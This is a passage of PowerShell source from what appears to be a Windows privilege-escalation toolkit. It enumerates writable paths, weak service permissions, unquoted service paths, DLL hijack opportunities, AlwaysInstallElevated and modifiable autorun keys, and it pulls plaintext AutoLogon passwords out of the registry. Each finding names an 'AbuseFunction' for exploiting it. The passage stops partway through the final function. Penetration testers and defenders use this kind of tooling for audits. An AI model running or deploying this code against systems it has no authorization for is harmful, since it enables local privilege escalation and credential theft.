    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}




function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{


    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    
    
    
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    
    
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    
    
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}








function Get-ModifiablePath {


    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Switch]
        $LiteralPaths
    )

    BEGIN {
        
        

        
        $AccessMask = @{
            [uint32]'0x80000000' = 'GenericRead'
            [uint32]'0x40000000' = 'GenericWrite'
            [uint32]'0x20000000' = 'GenericExecute'
            [uint32]'0x10000000' = 'GenericAll'
            [uint32]'0x02000000' = 'MaximumAllowed'
            [uint32]'0x01000000' = 'AccessSystemSecurity'
            [uint32]'0x00100000' = 'Synchronize'
            [uint32]'0x00080000' = 'WriteOwner'
            [uint32]'0x00040000' = 'WriteDAC'
            [uint32]'0x00020000' = 'ReadControl'
            [uint32]'0x00010000' = 'Delete'
            [uint32]'0x00000100' = 'WriteAttributes'
            [uint32]'0x00000080' = 'ReadAttributes'
            [uint32]'0x00000040' = 'DeleteChild'
            [uint32]'0x00000020' = 'Execute/Traverse'
            [uint32]'0x00000010' = 'WriteExtendedAttributes'
            [uint32]'0x00000008' = 'ReadExtendedAttributes'
            [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
            [uint32]'0x00000002' = 'WriteData/AddFile'
            [uint32]'0x00000001' = 'ReadData/ListDirectory'
        }

        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value

        $TranslatedIdentityReferences = @{}
    }

    PROCESS {

        ForEach($TargetPath in $Path) {

            $CandidatePaths = @()

            
            $SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")

            if($PSBoundParameters['LiteralPaths']) {

                $TempPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath))

                if(Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                }
                else {
                    
                    try {
                        $ParentPath = Split-Path $TempPath -Parent
                        if($ParentPath -and (Test-Path -Path $ParentPath)) {
                            $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                        }
                    }
                    catch {
                        
                    }
                }
            }
            else {
                ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
                    $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {

                        if(($SeparationCharacterSet -notmatch ' ')) {

                            $TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()

                            if($TempPath -and ($TempPath -ne '')) {
                                if(Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                                    
                                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                                }

                                else {
                                    
                                    try {
                                        $ParentPath = (Split-Path -Path $TempPath -Parent).Trim()
                                        if($ParentPath -and ($ParentPath -ne '') -and (Test-Path -Path $ParentPath )) {
                                            $CandidatePaths += Resolve-Path -Path $ParentPath | Select-Object -ExpandProperty Path
                                        }
                                    }
                                    catch {
                                        
                                    }
                                }
                            }
                        }
                        else {
                            
                            $CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
                        }
                    }
                }
            }

            $CandidatePaths | Sort-Object -Unique | ForEach-Object {
                $CandidatePath = $_
                Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {

                    $FileSystemRights = $_.FileSystemRights.value__

                    $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $accessMask[$_] }

                    
                    $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent

                    if($Comparison) {
                        if ($_.IdentityReference -notmatch '^S-1-5.*') {
                            if(-not ($TranslatedIdentityReferences[$_.IdentityReference])) {
                                
                                $IdentityUser = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
                                $TranslatedIdentityReferences[$_.IdentityReference] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                            }
                            $IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]
                        }
                        else {
                            $IdentitySID = $_.IdentityReference
                        }

                        if($CurrentUserSids -contains $IdentitySID) {
                            New-Object -TypeName PSObject -Property @{
                                ModifiablePath = $CandidatePath
                                IdentityReference = $_.IdentityReference
                                Permissions = $Permissions
                            }
                        }
                    }
                }
            }
        }
    }
}


function Get-CurrentUserTokenGroupSid {


    [CmdletBinding()]
    Param()

    $CurrentProcess = $Kernel32::GetCurrentProcess()

    $TOKEN_QUERY= 0x0008

    
    [IntPtr]$hProcToken = [IntPtr]::Zero
    $Success = $Advapi32::OpenProcessToken($CurrentProcess, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if($Success) {
        $TokenGroupsPtrSize = 0
        
        $Success = $Advapi32::GetTokenInformation($hProcToken, 2, 0, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize)

        [IntPtr]$TokenGroupsPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenGroupsPtrSize)

        
        $Success = $Advapi32::GetTokenInformation($hProcToken, 2, $TokenGroupsPtr, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

        if($Success) {

            $TokenGroups = $TokenGroupsPtr -as $TOKEN_GROUPS

            For ($i=0; $i -lt $TokenGroups.GroupCount; $i++) {
                
                $SidString = ''
                $Result = $Advapi32::ConvertSidToStringSid($TokenGroups.Groups[$i].SID, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if($Result -eq 0) {
                    Write-Verbose "Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                }
                else {
                    $GroupSid = New-Object PSObject
                    $GroupSid | Add-Member Noteproperty 'SID' $SidString
                    
                    $GroupSid | Add-Member Noteproperty 'Attributes' ($TokenGroups.Groups[$i].Attributes -as $SidAttributes)
                    $GroupSid
                }
            }
        }
        else {
            Write-Warning ([ComponentModel.Win32Exception] $LastError)
        }
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenGroupsPtr)
    }
    else {
        Write-Warning ([ComponentModel.Win32Exception] $LastError)
    }
}


function Add-ServiceDacl {


    [OutputType('ServiceProcess.ServiceController')]
    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    BEGIN {
        filter Local:Get-ServiceReadControlHandle {
            [OutputType([IntPtr])]
            param (
                [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
                [ValidateNotNullOrEmpty()]
                [ValidateScript({ $_ -as 'ServiceProcess.ServiceController' })]
                $Service
            )

            $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')

            $ReadControl = 0x00020000

            $RawHandle = $GetServiceHandle.Invoke($Service, @($ReadControl))

            $RawHandle
        }
    }

    PROCESS {
        ForEach($ServiceName in $Name) {

            $IndividualService = Get-Service -Name $ServiceName -ErrorAction Stop

            try {
                Write-Verbose "Add-ServiceDacl IndividualService : $($IndividualService.Name)"
                $ServiceHandle = Get-ServiceReadControlHandle -Service $IndividualService
            }
            catch {
                $ServiceHandle = $Null
                Write-Verbose "Error opening up the service handle with read control for $($IndividualService.Name) : $_"
            }

            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
                $SizeNeeded = 0

                $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                
                if ((-not $Result) -and ($LastError -eq 122) -and ($SizeNeeded -gt 0)) {
                    $BinarySecurityDescriptor = New-Object Byte[]($SizeNeeded)

                    $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $BinarySecurityDescriptor, $BinarySecurityDescriptor.Count, [Ref] $SizeNeeded);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if (-not $Result) {
                        Write-Error ([ComponentModel.Win32Exception] $LastError)
                    }
                    else {
                        $RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $BinarySecurityDescriptor, 0
                        $Dacl = $RawSecurityDescriptor.DiscretionaryAcl | ForEach-Object {
                            Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value ($_.AccessMask -as $ServiceAccessRights) -PassThru
                        }

                        Add-Member -InputObject $IndividualService -MemberType NoteProperty -Name Dacl -Value $Dacl -PassThru
                    }
                }
                else {
                    Write-Error ([ComponentModel.Win32Exception] $LastError)
                }

                $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
            }
        }
    }
}

function Test-ServiceDaclPermission {


    [OutputType('ServiceProcess.ServiceController')]
    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String[]]
        [ValidateSet('QueryConfig', 'ChangeConfig', 'QueryStatus', 'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', 'UserDefinedControl', 'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity', 'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess')]
        $Permissions,

        [String]
        [ValidateSet('ChangeConfig', 'Restart', 'AllAccess')]
        $PermissionSet = 'ChangeConfig'
    )

    BEGIN {
        $AccessMask = @{
            'QueryConfig'           = [uint32]'0x00000001'
            'ChangeConfig'          = [uint32]'0x00000002'
            'QueryStatus'           = [uint32]'0x00000004'
            'EnumerateDependents'   = [uint32]'0x00000008'
            'Start'                 = [uint32]'0x00000010'
            'Stop'                  = [uint32]'0x00000020'
            'PauseContinue'         = [uint32]'0x00000040'
            'Interrogate'           = [uint32]'0x00000080'
            'UserDefinedControl'    = [uint32]'0x00000100'
            'Delete'                = [uint32]'0x00010000'
            'ReadControl'           = [uint32]'0x00020000'
            'WriteDac'              = [uint32]'0x00040000'
            'WriteOwner'            = [uint32]'0x00080000'
            'Synchronize'           = [uint32]'0x00100000'
            'AccessSystemSecurity'  = [uint32]'0x01000000'
            'GenericAll'            = [uint32]'0x10000000'
            'GenericExecute'        = [uint32]'0x20000000'
            'GenericWrite'          = [uint32]'0x40000000'
            'GenericRead'           = [uint32]'0x80000000'
            'AllAccess'             = [uint32]'0x000F01FF'
        }

        $CheckAllPermissionsInSet = $False

        if($PSBoundParameters['Permissions']) {
            $TargetPermissions = $Permissions
        }
        else {
            if($PermissionSet -eq 'ChangeConfig') {
                $TargetPermissions = @('ChangeConfig', 'WriteDac', 'WriteOwner', 'GenericAll', ' GenericWrite', 'AllAccess')
            }
            elseif($PermissionSet -eq 'Restart') {
                $TargetPermissions = @('Start', 'Stop')
                $CheckAllPermissionsInSet = $True 
            }
            elseif($PermissionSet -eq 'AllAccess') {
                $TargetPermissions = @('GenericAll', 'AllAccess')
            }
        }
    }

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = $IndividualService | Add-ServiceDacl

            if($TargetService -and $TargetService.Dacl) {

                
                $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
                $CurrentUserSids += $UserIdentity.User.Value

                ForEach($ServiceDacl in $TargetService.Dacl) {
                    if($CurrentUserSids -contains $ServiceDacl.SecurityIdentifier) {

                        if($CheckAllPermissionsInSet) {
                            $AllMatched = $True
                            ForEach($TargetPermission in $TargetPermissions) {
                                
                                if (($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -ne $AccessMask[$TargetPermission]) {
                                    
                                    $AllMatched = $False
                                    break
                                }
                            }
                            if($AllMatched) {
                                $TargetService
                            }
                        }
                        else {
                            ForEach($TargetPermission in $TargetPermissions) {
                                
                                if (($ServiceDacl.AceType -eq 'AccessAllowed') -and ($ServiceDacl.AccessRights -band $AccessMask[$TargetPermission]) -eq $AccessMask[$TargetPermission]) {
                                    Write-Verbose "Current user has '$TargetPermission' for $IndividualService"
                                    $TargetService
                                    break
                                }
                            }
                        }
                    }
                }
            }
            else {
                Write-Verbose "Error enumerating the Dacl for service $IndividualService"
            }
        }
    }
}








function Get-ServiceUnquoted {

    [CmdletBinding()] param()

    
    $VulnServices = Get-WmiObject -Class win32_service | Where-Object {$_} | Where-Object {($_.pathname -ne $null) -and ($_.pathname.trim() -ne '')} | Where-Object { (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'"))} | Where-Object {($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf(".exe") + 4)) -match ".* .*"}

    if ($VulnServices) {
        ForEach ($Service in $VulnServices) {

            $ModifiableFiles = $Service.pathname.split(' ') | Get-ModifiablePath

            $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                $ServiceRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $Service.name

                if($ServiceRestart) {
                    $CanRestart = $True
                }
                else {
                    $CanRestart = $False
                }

                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                $Out | Add-Member Noteproperty 'Path' $Service.pathname
                $Out | Add-Member Noteproperty 'ModifiablePath' $_
                $Out | Add-Member Noteproperty 'StartName' $Service.startname
                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-ServiceBinary -Name '$($Service.name)' -Path <HijackPath>"
                $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
                $Out
            }
        }
    }
}


function Get-ModifiableServiceFile {

    [CmdletBinding()] param()

    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {

        $ServiceName = $_.name
        $ServicePath = $_.pathname
        $ServiceStartName = $_.startname

        $ServicePath | Get-ModifiablePath | ForEach-Object {

            $ServiceRestart = Test-ServiceDaclPermission -PermissionSet 'Restart' -Name $ServiceName

            if($ServiceRestart) {
                $CanRestart = $True
            }
            else {
                $CanRestart = $False
            }

            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
            $Out | Add-Member Noteproperty 'Path' $ServicePath
            $Out | Add-Member Noteproperty 'ModifiableFile' $_.ModifiablePath
            $Out | Add-Member Noteproperty 'ModifiableFilePermissions' $($_.Permissions -join ", ")
            $Out | Add-Member Noteproperty 'ModifiableFileIdentityReference' $_.IdentityReference
            $Out | Add-Member Noteproperty 'StartName' $ServiceStartName
            $Out | Add-Member Noteproperty 'AbuseFunction' "Install-ServiceBinary -Name '$ServiceName'"
            $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
            $Out
        }
    }
}


function Get-ModifiableService {

    [CmdletBinding()] param()

    Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeConfig' | ForEach-Object {

        $ServiceDetails = $_ | Get-ServiceDetail

        $ServiceRestart = $_ | Test-ServiceDaclPermission -PermissionSet 'Restart'

        if($ServiceRestart) {
            $CanRestart = $True
        }
        else {
            $CanRestart = $False
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceName' $ServiceDetails.name
        $Out | Add-Member Noteproperty 'Path' $ServiceDetails.pathname
        $Out | Add-Member Noteproperty 'StartName' $ServiceDetails.startname
        $Out | Add-Member Noteproperty 'AbuseFunction' "Invoke-ServiceAbuse -Name '$($ServiceDetails.name)'"
        $Out | Add-Member Noteproperty 'CanRestart' $CanRestart
        $Out
    }
}


function Get-ServiceDetail {


    param (
        [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    PROCESS {

        ForEach($IndividualService in $Name) {

            $TargetService = Get-Service -Name $IndividualService

            Get-WmiObject -Class win32_service -Filter "Name='$($TargetService.Name)'" | Where-Object {$_} | ForEach-Object {
                try {
                    $_
                }
                catch{
                    Write-Verbose "Error: $_"
                    $null
                }
            }
        }
    }
}








function Find-ProcessDLLHijack {


    [CmdletBinding()]
    Param(
        [Parameter(Position=0, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('ProcessName')]
        [String[]]
        $Name = $(Get-Process | Select-Object -Expand Name),

        [Switch]
        $ExcludeWindows,

        [Switch]
        $ExcludeProgramFiles,

        [Switch]
        $ExcludeOwned
    )

    BEGIN {
        
        
        $Keys = (Get-Item "HKLM:\System\CurrentControlSet\Control\Session Manager\KnownDLLs")
        $KnownDLLs = $(ForEach ($KeyName in $Keys.GetValueNames()) { $Keys.GetValue($KeyName) }) | Where-Object { $_.EndsWith(".dll") }
        $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

        
        $Owners = @{}
        Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object { $Owners[$_.handle] = $_.getowner().user }
    }

    PROCESS {

        ForEach ($ProcessName in $Name) {

            $TargetProcess = Get-Process -Name $ProcessName

            if($TargetProcess -and $TargetProcess.Path -and ($TargetProcess.Path -ne '') -and ($TargetProcess.Path -ne $Null)) {

                try {
                    $BasePath = $TargetProcess.Path | Split-Path -Parent

                    $LoadedModules = $TargetProcess.Modules

                    $ProcessOwner = $Owners[$TargetProcess.Id.ToString()]

                    ForEach ($Module in $LoadedModules){

                        $ModulePath = "$BasePath\$($Module.ModuleName)"

                        
                        if ((-not $ModulePath.Contains('C:\Windows\System32')) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -NotContains $Module.ModuleName)) {

                            $Exclude = $False

                            if($PSBoundParameters['ExcludeWindows'] -and $ModulePath.Contains('C:\Windows')) {
                                $Exclude = $True
                            }

                            if($PSBoundParameters['ExcludeProgramFiles'] -and $ModulePath.Contains('C:\Program Files')) {
                                $Exclude = $True
                            }

                            if($PSBoundParameters['ExcludeOwned'] -and $CurrentUser.Contains($ProcessOwner)) {
                                $Exclude = $True
                            }

                            
                            if (-not $Exclude){
                                $Out = New-Object PSObject
                                $Out | Add-Member Noteproperty 'ProcessName' $TargetProcess.ProcessName
                                $Out | Add-Member Noteproperty 'ProcessPath' $TargetProcess.Path
                                $Out | Add-Member Noteproperty 'ProcessOwner' $ProcessOwner
                                $Out | Add-Member Noteproperty 'ProcessHijackableDLL' $ModulePath
                                $Out
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "Error: $_"
                }
            }
        }
    }
}


function Find-PathDLLHijack {


    [CmdletBinding()]
    Param()

    
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        $TargetPath = $_

        $ModifiablePaths = $TargetPath | Get-ModifiablePath -LiteralPaths | Where-Object {$_ -and ($_ -ne $Null) -and ($_.ModifiablePath -ne $Null) -and ($_.ModifiablePath.Trim() -ne '')}
        ForEach($ModifiablePath in $ModifiablePaths) {
            if($ModifiablePath.ModifiablePath -ne $Null) {
                $ModifiablePath | Add-Member Noteproperty '%PATH%' $_
                $ModifiablePath.Permissions = $ModifiablePath.permissions -join ', '
                $ModifiablePath
            }
        }
    }
}








function Get-RegistryAlwaysInstallElevated {


    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    if (Test-Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer") {

        $HKLMval = (Get-ItemProperty -Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
        Write-Verbose "HKLMval: $($HKLMval.AlwaysInstallElevated)"

        if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){

            $HKCUval = (Get-ItemProperty -Path "HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
            Write-Verbose "HKCUval: $($HKCUval.AlwaysInstallElevated)"

            if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
                Write-Verbose "AlwaysInstallElevated enabled on this machine!"
                $True
            }
            else{
                Write-Verbose "AlwaysInstallElevated not enabled on this machine."
                $False
            }
        }
        else{
            Write-Verbose "AlwaysInstallElevated not enabled on this machine."
            $False
        }
    }
    else{
        Write-Verbose "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer does not exist"
        $False
    }

    $ErrorActionPreference = $OrigError
}


function Get-RegistryAutoLogon {


    [CmdletBinding()]
    Param()

    $AutoAdminLogon = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)

    Write-Verbose "AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)"

    if ($AutoAdminLogon -and ($AutoAdminLogon.AutoAdminLogon -ne 0)) {

        $DefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
        $DefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
        $DefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
        $AltDefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
        $AltDefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
        $AltDefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword

        if ($DefaultUserName -or $AltDefaultUserName) {
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'DefaultDomainName' $DefaultDomainName
            $Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
            $Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
            $Out | Add-Member Noteproperty 'AltDefaultDomainName' $AltDefaultDomainName
            $Out | Add-Member Noteproperty 'AltDefaultUserName' $AltDefaultUserName
            $Out | Add-Member Noteproperty 'AltDefaultPassword' $AltDefaultPassword
            $Out
        }
    }
}

function Get-ModifiableRegistryAutoRun {


    [CmdletBinding()]
    Param()

    $SearchLocations = @(   "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService"
                        )

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {

        $Keys = Get-Item -Path $_
        $ParentPath = $_

        ForEach ($Name in $Keys.GetValueNames()) {

            $Path = $($Keys.GetValue($Name))

            $Path | Get-ModifiablePath | ForEach-Object {
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'Key' "$ParentPath\$Name"
                $Out | Add-Member Noteproperty 'Path' $Path
                $Out | Add-Member Noteproperty 'ModifiableFile' $_
                $Out
            }
        }
    }

